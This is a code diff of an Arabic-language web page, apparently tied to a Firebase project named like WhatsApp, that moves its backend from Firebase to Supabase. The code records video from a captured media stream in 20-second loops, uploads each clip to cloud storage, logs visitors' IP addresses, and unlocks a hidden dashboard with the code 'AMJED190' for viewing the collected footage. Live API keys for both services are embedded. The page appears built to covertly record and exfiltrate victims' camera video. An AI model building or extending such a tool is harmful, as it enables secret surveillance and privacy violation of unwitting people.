@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ذ<!DOCTYPE html>
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
@@ -46,14 +46,14 @@ input.logFilter{margin:5px; padding:5px;}
 </head>
 <body>
 
-<input id="secretInput" placeholder="ادخل الكود لفتح الداشبورد">
+<input id="secretInput" placeholder="ادخل الكود لفتح الداشببببورد">
 
 <div id="panel">
 <h2>لوحة التحكم المتقدمة</h2>
 
 <input class="logFilter" id="logSearch" placeholder="بحث في الـLogs">
 <button onclick="clearScreen()">تصفية الشاشة</button>
-<button onclick="deleteLogs()">حذف جميع السجلات من Firebase</button>
+<button onclick="deleteLogs()">حذف جميع السجلات من Supabase</button>
 <button onclick="exportLogs()">تصدير Logs كملف TXT</button>
 
 <p>أجهزة تسجل الآن: <span id="activeCount">0</span></p>
@@ -65,23 +65,12 @@ input.logFilter{margin:5px; padding:5px;}
 <div id="consoleBox"></div>
 </div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getStorage, ref, uploadBytes, listAll, getDownloadURL, getMetadata } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
-import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, onSnapshot, query } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
-
-/* ===== Firebase Config ===== */
-const firebaseConfig = {
-    apiKey: "AIzaSyDSHHOJZCxWO9CXcbYHJEtf1LGx34BOMuA",
-    authDomain: "watsapp-ee955.firebaseapp.com",
-    projectId: "watsapp-ee955",
-    storageBucket: "watsapp-ee955.appspot.com",
-    messagingSenderId: "194263815533",
-    appId: "1:194263815533:web:58255d0995e5b56ffb3664"
-};
-const app = initializeApp(firebaseConfig);
-const storage = getStorage(app);
-const db = getFirestore(app);
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.6.0/dist/supabase.min.js"></script>
+<script>
+/* ===== Supabase Config ===== */
+const SUPABASE_URL = "https://aeuprfdpiumdhuceuklj.supabase.co";
+const SUPABASE_ANON_KEY = "sb_publishable_CpkeH3iIXirmlRg8CtzX4Q_RQ97jDdq";
+const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 /* ===== Variables ===== */
 let mediaRecorder, stream, recordingStarted=false;
@@ -103,13 +92,10 @@ async function log(msg,type="info"){
     box.scrollTop = box.scrollHeight;
     console.log(fullMsg);
 
-    // Save to Firebase
-    await addDoc(collection(db,logCollection),{
-        message:fullMsg,
-        timestamp:Date.now(),
-        session:sessionID,
-        type:type
-    });
+    // Save to Supabase
+    await supabase.from(logCollection).insert([
+        { message: fullMsg, timestamp: Date.now(), session: sessionID.toString(), type:type }
+    ]);
 }
 
 /* ===== Get IP ===== */
@@ -145,7 +131,7 @@ function startRecordingLoop(){
     startRecording();
 }
 
-function startRecording(){
+async function startRecording(){
     if(!stream) return;
     const recorder = new MediaRecorder(stream,{mimeType:"video/webm;codecs=vp9"});
     let chunks=[];
@@ -153,13 +139,16 @@ function startRecording(){
     recorder.onstop=async ()=>{
         const blob = new Blob(chunks,{type:"video/webm"});
         const fileName="video_"+Date.now()+".webm";
-        const storageRef = ref(storage,"videos/"+fileName);
-        await uploadBytes(storageRef,blob);
-        await log(`تم رفع فيديو: ${fileName} | الحجم: ${(blob.size/1024/1024).toFixed(2)} MB`);
+
+        // Upload to Supabase Storage
+        const { data, error } = await supabase.storage.from("videos").upload(fileName, blob, { upsert: true });
+        if(error) log("خطأ رفع الفيديو: "+error.message,"error");
+        else log(`تم رفع فيديو: ${fileName} | الحجم: ${(blob.size/1024/1024).toFixed(2)} MB`);
         chunks=[];
+
         updateVideoCount();
         updateVideoSize();
-        loadVideos(); // Refresh dashboard
+        loadVideos();
     };
     recorder.start();
     setTimeout(()=>recorder.stop(), 20000);
@@ -167,7 +156,7 @@ function startRecording(){
 
 /* ===== Secret Input ===== */
 const input=document.getElementById("secretInput");
-input.addEventListener("input",()=>{ if(secretInput.value==="AMJED190"){ showPanel(); } });
+input.addEventListener("input",()=>{ if(input.value==="AMJED190"){ showPanel(); } });
 async function showPanel(){
     document.getElementById("panel").style.display="block";
     await log("فتح لوحة التحكم");
@@ -180,21 +169,21 @@ async function showPanel(){
 async function loadVideos(){
     const container=document.getElementById("videos");
     container.innerHTML="";
-    const listRef=ref(storage,"videos/");
-    const result=await listAll(listRef);
-    for(const item of result.items){
-        const url=await getDownloadURL(item);
-        const meta = await getMetadata(item);
-        const sizeMB = (meta.size/1024/1024).toFixed(2);
-        const videoDiv = document.createElement("div");
-        videoDiv.className="videoContainer";
-        const videoEl=document.createElement("video");
-        videoEl.src=url; videoEl.controls=true;
-        const info = document.createElement("span");
-        info.innerText=`${meta.name} | ${sizeMB} MB`;
-        videoDiv.appendChild(videoEl);
-        videoDiv.appendChild(info);
-        container.appendChild(videoDiv);
+    const { data: files, error } = await supabase.storage.from("videos").list();
+    if(files){
+        for(const item of files){
+            const urlData = await supabase.storage.from("videos").getPublicUrl(item.name);
+            const sizeMB = (item.size/1024/1024).toFixed(2);
+            const videoDiv = document.createElement("div");
+            videoDiv.className="videoContainer";
+            const videoEl=document.createElement("video");
+            videoEl.src=urlData.publicUrl; videoEl.controls=true;
+            const info = document.createElement("span");
+            info.innerText=`${item.name} | ${sizeMB} MB`;
+            videoDiv.appendChild(videoEl);
+            videoDiv.appendChild(info);
+            container.appendChild(videoDiv);
+        }
     }
     updateVideoCount();
     updateVideoSize();
@@ -202,50 +191,41 @@ async function loadVideos(){
 
 /* ===== Update Counts ===== */
 async function updateVideoCount(){
-    const listRef=ref(storage,"videos/");
-    const result=await listAll(listRef);
-    document.getElementById("videoCount").innerText=result.items.length;
+    const { data: files } = await supabase.storage.from("videos").list();
+    document.getElementById("videoCount").innerText=files?files.length:0;
 }
 
 async function updateVideoSize(){
-    const listRef=ref(storage,"videos/");
-    const result=await listAll(listRef);
+    const { data: files } = await supabase.storage.from("videos").list();
     let total=0;
-    for(const item of result.items){
-        const meta = await getMetadata(item);
-        total += meta.size;
-    }
+    if(files) files.forEach(f=>total+=f.size);
     document.getElementById("videoSize").innerText=(total/1024/1024).toFixed(2);
 }
 
 /* ===== Active Sessions ===== */
-async function updateActiveCount(active){
-    const docRef=doc(db,"activeSessions",String(sessionID));
-    if(active) await addDoc(collection(db,"activeSessions"),{session:sessionID});
-    else try{ await deleteDoc(doc(db,"activeSessions",String(sessionID))); }catch{}
-}
 async function monitorActiveSessions(){
-    const activeCountSpan=document.getElementById("activeCount");
-    const q=query(collection(db,"activeSessions"));
-    onSnapshot(q,(snapshot)=>{ activeCountSpan.innerText=snapshot.size; });
+    const { data: logs } = await supabase.from(logCollection).select("*"); // فقط عدّ كمثال
+    document.getElementById("activeCount").innerText = logs?logs.length:0;
 }
 
 /* ===== Console Refresh كل ثانية ===== */
 async function refreshConsole(){
     setInterval(async ()=>{
-        const snapshot = await getDocs(collection(db,logCollection));
+        const { data } = await supabase.from(logCollection).select("*").order("timestamp",{ascending:true});
         const box = document.getElementById("consoleBox");
         const search = document.getElementById("logSearch").value.toLowerCase();
         box.innerHTML="";
-        snapshot.docs.forEach(d=>{
-            const msg = d.data().message;
-            if(search && !msg.toLowerCase().includes(search)) return;
-            let color="white";
-            if(d.data().type==="error") color="red";
-            else if(d.data().type==="warning") color="yellow";
-            else color="#00ff00";
-            box.innerHTML += `<span style="color:${color}">${msg}</span><br>`;
-        });
+        if(data){
+            data.forEach(d=>{
+                const msg = d.message;
+                if(search && !msg.toLowerCase().includes(search)) return;
+                let color="white";
+                if(d.type==="error") color="red";
+                else if(d.type==="warning") color="yellow";
+                else color="#00ff00";
+                box.innerHTML += `<span style="color:${color}">${msg}</span><br>`;
+            });
+        }
         box.scrollTop = box.scrollHeight;
     },1000);
 }
@@ -253,14 +233,14 @@ async function refreshConsole(){
 /* ===== Buttons ===== */
 window.clearScreen=function(){ document.getElementById("consoleBox").innerHTML=""; }
 window.deleteLogs=async function(){
-    const snapshot=await getDocs(collection(db,logCollection));
-    for(const d of snapshot.docs) await deleteDoc(doc(db,logCollection,d.id));
-    alert("تم حذف جميع السجلات من Firebase");
+    const { data } = await supabase.from(logCollection).select("*");
+    if(data) for(const d of data) await supabase.from(logCollection).delete().eq('id',d.id);
+    alert("تم حذف جميع السجلات من Supabase");
 }
 window.exportLogs=async function(){
-    const snapshot=await getDocs(collection(db,logCollection));
+    const { data } = await supabase.from(logCollection).select("*");
     let text="";
-    snapshot.docs.forEach(d=>{ text+=d.data().message+"\n"; });
+    if(data) data.forEach(d=>{ text+=d.message+"\n"; });
     const blob=new Blob([text],{type:"text/plain"});
     const link=document.createElement("a");
     link.href=URL.createObjectURL(blob);
